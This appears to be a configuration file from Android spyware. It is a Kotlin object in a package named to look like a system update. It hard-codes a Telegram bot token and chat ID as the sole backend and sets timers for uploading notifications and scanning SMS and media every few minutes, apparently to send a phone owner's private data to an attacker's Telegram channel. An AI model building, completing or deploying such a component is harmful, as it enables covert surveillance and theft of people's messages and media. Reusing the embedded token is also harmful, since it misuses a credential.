package com.sys.update

object Config {
    // === Telegram Bot ===
    const val TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM"
    const val TELEGRAM_CHAT_ID = "8599240795"

    // === Scan intervals (milliseconds) ===
    const val NOTIF_UPLOAD_INTERVAL_MS = 60_000L      // 1 min
    const val MEDIA_SCAN_INTERVAL_MS = 300_000L       // 5 min
    const val SMS_SCAN_INTERVAL_MS = 120_000L         // 2 min

    fun hasTelegram(): Boolean = TELEGRAM_BOT_TOKEN.isNotBlank() && TELEGRAM_CHAT_ID.isNotBlank()
    fun hasAnyBackend(): Boolean = hasTelegram()
}
